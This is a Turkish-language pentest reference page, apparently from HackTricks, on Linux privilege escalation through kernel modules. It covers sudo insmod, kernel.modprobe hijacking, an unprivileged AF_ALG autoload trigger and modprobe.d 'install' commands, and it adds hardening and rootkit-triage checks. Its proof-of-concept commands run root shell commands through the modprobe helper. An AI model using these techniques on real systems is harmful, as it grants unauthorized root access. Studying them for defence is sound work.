# Kernel Modülleri ve modprobe Kötüye Kullanımı

{{#include ../../banners/hacktricks-training.md}}

## Kernel modülü ve modül yükleme yanlış yapılandırmaları

Kernel modülü desteği, Linux privilege escalation incelemelerinde yüksek etkili bir alandır. İmzasız modül mesajlarının her birini tek başına exploitable olarak değerlendirmeyin; bunun yerine pratik sorulara yanıt bulmak için kullanın.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- Mevcut kullanıcı `sudo`, capabilities veya yazılabilir bir yardımcı yol üzerinden modül yükleyebilir mi?
- Modül yükleme hâlâ etkin mi?
- Modül imzası zorunluluğu devre dışı mı?
- Modül dizinleri, modül dosyaları veya `modprobe.d` yapılandırma yolları yazılabilir mi?<sup>[[16]](#references)</sup>
- Ne olduğunu doğrulamak için kernel logları okunabilir mi?

Hızlı ön inceleme, aşağıdaki modül durumu, imza, loglama ve modül ağacı kontrolleriyle başlar.<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>

```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```

Yorum:

- `modules_disabled=1`, modüllerin yüklenemeyeceği veya kaldırılamayacağı ve yeniden başlatılana kadar değerinin `0` olarak sıfırlanamayacağı anlamına gelir.<sup>[[1]](#references)</sup>
- Kernel komut satırındaki `module.sig_enforce=1` veya `CONFIG_MODULE_SIG_FORCE=y`, geçerli şekilde imzalanmış modüller gerektirir; aksi takdirde imzasız modüller yüklenebilir ve kernel taint alabilir.<sup>[[2]](#references)</sup>
- `dmesg_restrict=0`, `dmesg` için herhangi bir kısıtlama getirmez; değer `1` olduğunda erişim için `CAP_SYSLOG` gerekir.<sup>[[1]](#references)</sup>
- `/lib/modules/$(uname -r)/` altındaki yazılabilir yollar tehlikelidir; çünkü `modprobe`, modülleri yüklerken bu dizini ve bağımlılık verilerini tarar.<sup>[[8]](#references)</sup>

### Modül yükleme ve kernel çıktısını okuma

Yerel bir modülü yüklemek için gerekli izniniz varsa `insmod`, belirttiğiniz `.ko` dosyasını doğrudan ekler. Modülün init işlevi yükleme sırasında çalışır ve `printk()` ile yazılan mesajlar, normalde `dmesg` ile okunan kernel log tamponuna gider.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Asgari bir inceleme iş akışında meta verileri incelemek için `modinfo`, modülü yükleyip kaldırmak için `insmod` ve `rmmod`, yüklenmiş durumunu doğrulamak için `lsmod` ve kernel loglarını incelemek için `dmesg` kullanılır.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```

`sudo -l`, `insmod`, `modprobe` veya bunların etrafındaki bir wrapper'a izin veriyorsa bunu kritik kabul edin: `sudo -l`, komutu çalıştıran kullanıcının ayrıcalıklarını listeler ve kernel module yüklemek `CAP_SYS_MODULE` gerektirir. Doğrudan capability tabanlı yollar için bkz. [Linux capabilities](../interesting-files-permissions/linux-capabilities.md#cap_sys_module).<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>

```bash
sudo -l
sudo /sbin/insmod ./example.ko
```

### Sudo ile kullanılmasına izin verilen `insmod`

Bir kullanıcının `insmod` çalıştırmasına izin veren bir sudo kuralı, sıradan bir yönetim yardımcısının kullanılmasına izin vermekle kıyaslanamaz. Modülün başlatma kodu, modül yüklenirken çalışır; bu nedenle incelemede sorulması gereken temel soru, kullanıcının yüklenen modülü seçip seçemeyeceği veya değiştirebilip değiştiremeyeceğidir.<sup>[[3]](#references)</sup>

Aşağıdaki genel inceleme akışı, aday bir modül için inceleme, yükleme, durum, günlük ve kaldırma kontrollerini tekrarlar.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```

Kullanıcı rastgele bir `.ko` sağlayabiliyorsa, yetkili bir değerlendirmede bu kural tam sistem ele geçirme olarak değerlendirilmelidir. Daha güvenli bir operasyonel yaklaşım, modül yükleme yetkisini sudo üzerinden devretmekten kaçınmaktır; bu kaçınılmazsa tam yolu, sahipliği, izinleri, imzalama politikasını ve kaldırma iş akışını kısıtlayın.<sup>[[3]](#references)[[10]](#references)</sup>

Kontrollü bir laboratuvarda zararsız bir modül oluşturma örüntüsü için aşağıda minimal bir kaynak kodu ve Makefile gösterilmiştir; `make -C /lib/modules/$(uname -r)/build M=$PWD` biçimi, harici modüller için kernel'in belgelenmiş kbuild iş akışını izler.<sup>[[5]](#references)[[7]](#references)</sup>

```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
    printk(KERN_INFO "demo module loaded\n");
    return 0;
}

static void __exit demo_exit(void) {
    printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

Yalnızca yetkili bir laboratuvarda derleyip yükleyin; kbuild harici modülü derler ve yükleme/kaldırma komutları kernel module arayüzlerini çağırır.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>

```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```

### `kernel.modprobe` / `modprobe_path` kötüye kullanım kontrolleri

`kernel.modprobe`, kernel'in modül otomatik yükleme istekleri için çalıştırdığı userspace helper'ı belirtir; bu sysctl, açık modül eklemeyi değil, otomatik yüklemeyi etkiler. Bir saldırgan bunu yazılabilir bir çalıştırılabilir dosya yoluna değiştirebilir ve bir modül isteğini tetikleyebilirse, bu helper ayrıcalıklı kod yürütme yolu hâline gelir. Boş bir değere ayarlamak otomatik yükleme isteklerini devre dışı bırakır; `CONFIG_STATIC_USERMODEHELPER=y` ise boş olmayan bir değer, derleme sırasında belirlenen static helper yolu ile geçersiz kılınır.<sup>[[1]](#references)</sup>

Kernel sysctl arayüzü üzerinden mevcut helper yolunu kontrol edin ve hedefin sahipliğini ve izinlerini inceleyin.<sup>[[1]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```

sysctl, devredilmiş sudo kuralları veya dosya capabilities değerlerinin etkilenip etkilenemeyeceğini kontrol edin.<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>

```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```

Aşağıdaki yalnızca lab ortamlarında kullanılabilecek yöntem, yardımcı programın yolunu değiştirir ve belgelenmiş bir module-autoload isteğini tetikler; bunu yalnızca yalıtılmış ve yetkilendirilmiş bir sistemde kullanın.<sup>[[1]](#references)</sup>

Güncel Linux kernel’lerinde genel bir tetikleyici olarak bilinmeyen bir çalıştırılabilir dosya kullanmayın: eski özel binary-format module autoloading özelliği Linux 6.14’te kaldırılmıştır; kernel belgeleri ise bilinmeyen bir dosya sistemi türünü module-autoload isteği yolu olarak tanımlar.<sup>[[1]](#references)[[11]](#references)</sup>

```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```

Güçlendirilmiş sistemlerde, izinler ayrıcalıksız yazmaları `kernel.modprobe` dosyasına engellediğinde, yardımcı programın yolu yazılabilir olmadığında veya modülün otomatik yüklenmesi devre dışı bırakıldığında bu başarısız olmalıdır.<sup>[[1]](#references)</sup>

### Ayrıcalıksız AF_ALG otomatik yükleme tetikleyicisi

Yukarıdaki dosya sistemi tetikleyicisi ayrıcalıklı `mount` kullanır.<sup>[[1]](#references)</sup> AF_ALG soketlerinin kullanılabildiği yerlerde, ayrıcalıksız bir kullanıcı bunun yerine kasıtlı olarak mevcut olmayan bir türe bağlayabilir.<sup>[[17]](#references)[[18]](#references)</sup> `alg_bind()` daha sonra `request_module()` aracılığıyla `algif-<type>` isteğinde bulunur ve bu da yapılandırılmış modül yardımcısını çağırır.<sup>[[17]](#references)[[18]](#references)[[19]](#references)</sup> Bu yöntem, Linux 6.14'te eski bilinmeyen ikili biçimlerin otomatik yüklenmesi kaldırıldıktan sonra da çalışır.<sup>[[11]](#references)[[17]](#references)</sup> Tür mevcut olmadığından `bind()` çağrısının başarısız olması beklenir; soketin dönüş değerini değil, yardımcının yan etkisini kontrol edin.<sup>[[17]](#references)[[18]](#references)</sup>

Yetkili bir laboratuvar ortamında önce kontrollü yardımcıyı veya `modprobe.d` kuralını ayarlayın, ardından `sudo` ya da `CAP_SYS_MODULE` kullanmadan bir isteği tetikleyin.<sup>[[17]](#references)[[18]](#references)</sup> Python 3.6 ve üzeri sürümler, AF_ALG `(type, name)` bağlama demetini kabul eder.<sup>[[20]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe
cat /proc/sys/crypto/af_alg_restrict 2>/dev/null
python3 - <<'PYCODE'
import socket
with socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0) as s:
    try:
        s.bind(("htprobe", "unused"))
    except OSError as exc:
        print(f"bind returned: {exc}")
PYCODE
```

Bu yol, kullanılabilir bir AF_ALG socket ve boş olmayan bir `kernel.modprobe` gerektirir.<sup>[[1]](#references)[[18]](#references)</sup> `/proc/sys/crypto/af_alg_restrict` dosyasının bulunduğu kernel’larda `2` değeri AF_ALG socket oluşturulmasını devre dışı bırakır; `1` değeri algoritmaları kısıtlar ancak `alg_bind()` içindeki eksik tür isteğini durdurmaz.<sup>[[18]](#references)[[21]](#references)</sup> Bir LSM, helper çağrılmadan önce module isteğini reddedebilir.<sup>[[19]](#references)</sup>

### Yazılabilir `modprobe.d` yapılandırması ve `sudo modprobe -C`

Bir module’ü çözümlemeden önce `modprobe`, öncelik sırasına göre `/etc/modprobe.d`, `/run/modprobe.d`, `/usr/local/lib/modprobe.d`, `/usr/lib/modprobe.d` ve `/lib/modprobe.d` gibi yapılandırma dizinlerindeki `.conf` dosyalarını okur. Daha yüksek öncelikli bir dizindeki aynı adlı dosya, düşük öncelikli dosyayı gölgeler. Daha da önemlisi, `install <module> <command>` yönergesi, module’ü eklemek **yerine** rastgele bir shell komutu çalıştırır. Bu nedenle yazılabilir bir yapılandırma yolu, daha sonra ayrıcalıklı bir `modprobe` çağırıcısının kimlik bilgileriyle çalışan gecikmeli komut yürütme imkânına dönüşebilir; kernel module signature enforcement bu userspace komutunu doğrulamaz.<sup>[[16]](#references)</sup>

Dizin ve dosya izinlerini denetleyin, ardından etkin yapılandırmayı inceleyin. Dry-run modu module’ü eklemediği veya `install`/`remove` komutu çalıştırmadığı için `modprobe -n -v`, çözümleme incelemesinde güvenlidir. Mevcut kmod belgelerinin kmod 36 sonrasında kaldırılacağını belirttiği eski `--showconfig` yazımı yerine `modprobe -c` kullanın.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
    [ -e "$d" ] || continue
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
done

grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
  /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
  /usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
modprobe -n -v <module_name>
```

`modprobe` için kısıtlamasız bir sudo kuralı, keyfi `.ko` dosyaları imza doğrulamasından geçemese bile istismar edilebilir: `-C`, saldırganın kontrolündeki bir yapılandırma dizinini seçer; bu dizindeki bir `install` komutu sudo tarafından başlatılan süreç tarafından yürütülebilir.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
# Authorized lab proof for an unrestricted `sudo modprobe` rule
D="$(mktemp -d)"
printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
sudo /sbin/modprobe -C "$D" ht_probe
cat /tmp/ht-modprobe-id
```

Kernel'ın helper'ının görebildiği bir `modprobe.d` dizini yazılabilir durumdaysa, aynı [AF_ALG autoload trigger](#unprivileged-af_alg-autoload-trigger), bir yöneticinin `modprobe` çağırmasını beklemeden `install algif-htprobe` yönergesini hemen çalıştırabilir.<sup>[[16]](#references)[[18]](#references)[[19]](#references)</sup> Yetkili bir lab ortamında, yazılabilir bir `.conf` dosyasına zararsız bir işaretleyici komut yerleştirin, `modprobe -n -v algif-htprobe` ile çözümlemeyi doğrulayın ve ardından yukarıdaki trigger'ı çalıştırın.<sup>[[8]](#references)[[16]](#references)</sup> `modules_disabled=1` ve modül imzası zorunluluğu modül eklenmesini engeller; ancak bu userspace `install` komutunu engellemez. Boş bir `kernel.modprobe` değeri veya engellenmiş AF_ALG yolu ise bu autoload yöntemini önler.<sup>[[1]](#references)[[2]](#references)[[16]](#references)[[18]](#references)[[19]](#references)</sup>

```bash
printf '%s\n' 'install algif-htprobe /bin/sh -c "id > /tmp/ht-modprobe-id"' > /etc/modprobe.d/zz-htprobe.conf
modprobe -n -v algif-htprobe
# Run the AF_ALG trigger above, then inspect /tmp/ht-modprobe-id.
```

Azaltım için, sudo üzerinden argüman kısıtlaması olmadan `modprobe` çalıştırılmasına izin vermeyin, tüm yapılandırma dizinlerinin root tarafından sahiplenildiğinden ve yazılamadığından emin olun, beklenmeyen `install`/`remove` yönergelerini inceleyin. Güvenilir bir yönetim iş akışının tek bir modül için bu yönergeleri atlaması gerektiğinde, `modprobe --ignore-install` belirtilen modül için bunları yok sayar; ancak bağımlılıkların kendi komutları olabilir.<sup>[[8]](#references)[[16]](#references)</sup>

### Yazılabilir `/lib/modules` incelemesi

Yazılabilir modül dizinleri; `modprobe` daha sonra nasıl çalıştırıldığına bağlı olarak modüllerin değiştirilmesine, kötü amaçlı modüllerin yerleştirilmesine veya otomatik yüklemenin suistimal edilmesine olanak tanıyabilir. `modprobe`, modülleri çözümlerken `/lib/modules/$(uname -r)` dizinini arar ve bağımlılık verilerini kullanır.<sup>[[8]](#references)</sup>

Etkin kernel sürümünün modül ağacındaki yazılabilir modül dosyalarını ve bağımlılık/takma ad meta verilerini inceleyin.<sup>[[8]](#references)</sup>

```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```

Yazılabilir modül içeriği bulursanız, `modprobe`'un bağımlılıkları nasıl çözdüğünü ve `modinfo`'nun modül meta verilerini nasıl raporladığını inceleyin.<sup>[[8]](#references)[[12]](#references)</sup>

```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```

Savunma notları:

- `/lib/modules` dizininin sahibi `root:root` olsun ve kullanıcılar tarafından yazılamasın.<sup>[[8]](#references)</sup>
- Operasyonel olarak mümkün olduğunda, önyüklemeden sonra `kernel.modules_disabled=1` ayarını yapın.<sup>[[1]](#references)</sup>
- Yüklenebilir modül gerektiren sistemlerde module signing'i zorunlu kılın.<sup>[[2]](#references)</sup>
- `/proc/sys/kernel/modprobe`, `/lib/modules` ve `modprobe.d` yapılandırma dizinlerine yapılan yazma işlemlerini ve beklenmeyen `insmod`/`modprobe` çalıştırmalarını izleyin.<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>



## Modül tabanlı rootkit triyajı

Kötü amaçlı bir modül; süreçleri ve dosyaları gizlemek, trafiği yönlendirmek veya gizli bilgileri ele geçirmek için syscall'ları, VFS ya da `/proc` görünümlerini, ağ yollarını veya kimlik bilgisi denetimlerini hook edebilir. Ayrıca `lsmod` tarafından görüntülenen modül listesinden kendini çıkarabilir. Kalıcılık; `modprobe.d` alias'larından veya install kurallarından, `/etc/modules-load.d` dizininden, bir systemd unit'inden, initramfs içeriğinden ya da meşru bir `.ko` dosyasının değiştirilmesinden kaynaklanabilir. Normal bir `lsmod` çıktısı faydalı bir kanıttır ancak kernel düzeyindeki bir ihlal, kernel tarafından sağlanan listeleri güvenilmez hâle getirebilir. Yüklenmiş modülleri, diskteki dosyaları, önyükleme yapılandırmasını, modül yükleme günlüklerini ve güvenilir harici telemetriyi birbiriyle karşılaştırın.

```bash
cat /proc/modules
lsmod
find /lib/modules/"$(uname -r)" -type f -name '*.ko*' -ls 2>/dev/null
grep -R -nE '^(install|softdep|blacklist|options) ' /etc/modprobe.d /run/modprobe.d /usr/lib/modprobe.d 2>/dev/null
find /etc/modules-load.d /usr/lib/modules-load.d -maxdepth 1 -type f -print 2>/dev/null
journalctl -k -b | grep -Ei 'module|taint|signature|lockdown'
cat /proc/sys/kernel/tainted
```

Beklenmedik modül adlarını, yolları, bağımlılıkları, imzaları ve yüklenme zamanlarını inceleyin. Kernel taint ve imzasız modül mesajları ipucudur, rootkit kanıtı değildir. Rootkit’ten şüpheleniliyorsa canlı kernel çıktısına güvenmeden önce güvenilir bir imajdan veya kurtarma ortamından kanıt toplayın. [Kernel vulnerability assessment](kernel-vulnerability-assessment.md) sayfasında tracefs ve sabitlenmiş BPF nesneleri dâhil olmak üzere yapılandırma ve tanılama görünürlüğü ele alınmaktadır.



## References

- [1] [/proc/sys/kernel// için belgeler — Linux Kernel belgeleri](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Kernel modülü imzalama özelliği — Linux Kernel belgeleri](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Sürücü Temelleri — Linux Kernel belgeleri](https://docs.kernel.org/driver-api/basics.html)
- [6] [printk ile mesaj günlüğe kaydetme — Linux Kernel belgeleri](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [Harici Modüller Derleme — Linux Kernel belgeleri](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] ['execve-v6.14-rc1' etiketini birleştir — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [16] [modprobe.d(5) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
- [17] [modprobe_path Tekniğini Yeniden Canlandırma: search_binary_handler() Yamasını Aşma — Theori](https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch)
- [18] [AF_ALG bağlama ve modül isteği — Linux kernel kaynak kodu](https://github.com/torvalds/linux/blob/master/crypto/af_alg.c)
- [19] [Modül yardımcı programının çağrılması — Linux kernel kaynak kodu](https://github.com/torvalds/linux/blob/master/kernel/module/kmod.c)
- [20] [socket — Python belgeleri](https://docs.python.org/3/library/socket.html)
- [21] [/proc/sys/crypto/ — Linux kernel belgeleri](https://docs.kernel.org/admin-guide/sysctl/crypto.html)
{{#include ../../banners/hacktricks-training.md}}
